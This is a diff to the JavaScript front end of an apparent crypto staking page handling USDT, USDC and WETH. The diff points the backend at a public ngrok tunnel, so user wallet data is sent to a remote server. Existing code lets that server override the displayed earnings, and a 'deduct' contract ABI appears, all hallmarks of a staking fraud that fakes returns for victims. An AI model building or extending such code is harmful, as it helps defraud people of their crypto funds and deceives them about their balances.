@@ -4,8 +4,8 @@ const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
 
-// ===== 新增：API 服务器地址 =====
-const API_BASE_URL = 'http://localhost:3000'; // 您的本地后台服务器地址
+// ===== 关键部分：已更新为您的 ngrok 地址 =====
+const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';
 
 //---ABI Definitions---
 const DEDUCT_CONTRACT_ABI = [
@@ -48,8 +48,6 @@ let nextBenefitInterval = null;
 let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
 
 //---UI Control Functions---
-
-// ===== 新增：将用户数据发送到后端服务器 =====
 async function saveUserData() {
     if (!userAddress) return;
     const dataToSave = {
@@ -70,7 +68,6 @@ async function saveUserData() {
         console.warn("Could not send user data to the local server. Is it running?", error);
     }
 }
-
 
 function updateStatus(message, isWarning = false) {
     if (!statusDiv) return;
@@ -159,10 +156,7 @@ function updateTotalFunds() {
 
 async function updateInterest() {
     if (!stakingStartTime || !grossOutputValue || !cumulativeValue || !userAddress) return;
-
     let grossOutput, cumulative;
-
-    // 尝试从服务器获取覆盖值
     try {
         const response = await fetch(`${API_BASE_URL}/api/all-data`);
         if (response.ok) {
@@ -176,10 +170,8 @@ async function updateInterest() {
             }
         }
     } catch (error) {
-        // 如果无法连接服务器，则不应用覆盖，这很正常
+        // If server is unreachable, just continue with local calculation
     }
-
-    // 如果没有覆盖值，则按原逻辑计算
     if (typeof grossOutput === 'undefined') {
         const currentTime = Date.now();
         const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
@@ -187,14 +179,12 @@ async function updateInterest() {
         const interestRate = baseInterestRate * pledgedAmount;
         grossOutput = elapsedSeconds * interestRate;
     }
-     if (typeof cumulative === 'undefined') {
+    if (typeof cumulative === 'undefined') {
         cumulative = grossOutput - claimedInterest;
     }
-
     grossOutputValue.textContent = `${grossOutput.toFixed(7)} ETH`;
     cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`;
 }
-
 
 function updateNextBenefitTimer() {
     if (!nextBenefit) return;
@@ -213,7 +203,7 @@ function updateNextBenefitTimer() {
             newNextBenefitTimestamp += twelveHoursInMillis;
         }
         localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
-        saveUserData(); // 倒数周期更新时也保存一下数据
+        saveUserData();
         diff = newNextBenefitTimestamp - now;
     }
     const totalSeconds = Math.floor(diff / 1000);
@@ -323,7 +313,6 @@ async function initializeWallet() {
             return;
         }
         provider = new ethers.BrowserProvider(window.ethereum);
-        
         window.ethereum.on('accountsChanged', (newAccounts) => {
             if (userAddress) {
                 if (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
@@ -332,7 +321,6 @@ async function initializeWallet() {
             }
         });
         window.ethereum.on('chainChanged', () => window.location.reload());
-
         const accounts = await provider.send('eth_accounts', []);
         if (accounts.length > 0) {
             await connectWallet();
